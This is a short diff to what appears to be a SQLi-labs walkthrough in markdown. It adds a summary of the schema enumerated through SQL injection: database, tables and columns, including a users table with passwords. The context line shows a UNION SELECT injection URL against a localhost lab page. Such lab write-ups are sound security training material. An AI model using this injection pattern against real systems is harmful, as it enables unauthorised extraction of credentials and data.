@@ -286,6 +286,15 @@ http://localhost/sqli-labs/Less-1/?id=999' union select 1,group_concat(username)
 
 ![](images/1/47.png)
 
+```
+database = security
+tables = emails,referers,uagents,users
+columns of users table = id,username,password
+columns of uagents table = id,uagent,ip_address,username
+columns of referers table = id,referer,ip_address
+columns of emails table = id,email_id
+```
+
 ###### Enumerate using ```mysql``` client
 
 ```mysql
